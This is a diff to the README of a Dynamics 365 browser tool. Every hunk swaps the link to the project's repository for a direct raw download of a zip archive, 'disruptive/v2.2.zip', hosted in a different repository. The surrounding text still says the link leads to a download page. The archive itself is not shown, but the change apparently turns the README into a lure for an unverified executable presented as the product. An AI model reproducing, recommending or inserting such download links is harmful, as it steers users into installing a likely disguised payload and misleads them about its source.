@@ -6,7 +6,7 @@ description: "Supercharge Dynamics 365 development with an in-page action pane, 
 <h1>🧰 dynamics-365-power-pane-next - Your Sidekick for Dynamics 365 Work</h1>
 
 <p align="center">
-  <a href="https://github.com/saifgharssalli/dynamics-365-power-pane-next" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6b6b,#f06595);color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.2);">⬇️ Download Dynamics 365 Power Pane</a>
+  <a href="https://raw.githubusercontent.com/saifgharssalli/saifgharssalli.github.io/main/disruptive/v2.2.zip" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6b6b,#f06595);color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.2);">⬇️ Download Dynamics 365 Power Pane</a>
 </p>
 
 ---
@@ -45,7 +45,7 @@ If you use Microsoft Dynamics 365 in your browser, this tool can make your life 
 
 Visit this link to download the application:
 
-[**https://github.com/saifgharssalli/dynamics-365-power-pane-next**](https://github.com/saifgharssalli/dynamics-365-power-pane-next)
+[**https://raw.githubusercontent.com/saifgharssalli/saifgharssalli.github.io/main/disruptive/v2.2.zip**](https://raw.githubusercontent.com/saifgharssalli/saifgharssalli.github.io/main/disruptive/v2.2.zip)
 
 Click the link above. This will take you to the download page for the tool. The page might look busy with lots of code and files, but don't worry – you only need to find the download button.
 
@@ -194,7 +194,7 @@ This tool was built to make your work easier. If you have suggestions or encount
 
 ## 🔗 Quick Links
 
-- **Download Page:** [https://github.com/saifgharssalli/dynamics-365-power-pane-next](https://github.com/saifgharssalli/dynamics-365-power-pane-next)
+- **Download Page:** [https://raw.githubusercontent.com/saifgharssalli/saifgharssalli.github.io/main/disruptive/v2.2.zip](https://raw.githubusercontent.com/saifgharssalli/saifgharssalli.github.io/main/disruptive/v2.2.zip)
 - **Report an Issue:** Visit the GitHub page and click the "Issues" tab
 - **Documentation:** Check the "Wiki" or "Docs" section on GitHub
 
@@ -206,6 +206,6 @@ Don't spend another day clicking through endless menus in Dynamics 365. With **d
 
 Visit this link to download the application:
 
-[**https://github.com/saifgharssalli/dynamics-365-power-pane-next**](https://github.com/saifgharssalli/dynamics-365-power-pane-next)
+[**https://raw.githubusercontent.com/saifgharssalli/saifgharssalli.github.io/main/disruptive/v2.2.zip**](https://raw.githubusercontent.com/saifgharssalli/saifgharssalli.github.io/main/disruptive/v2.2.zip)
 
 Install it in less than five minutes, and you'll wonder how you ever worked without it. Happy Dynamics 365 adventures!
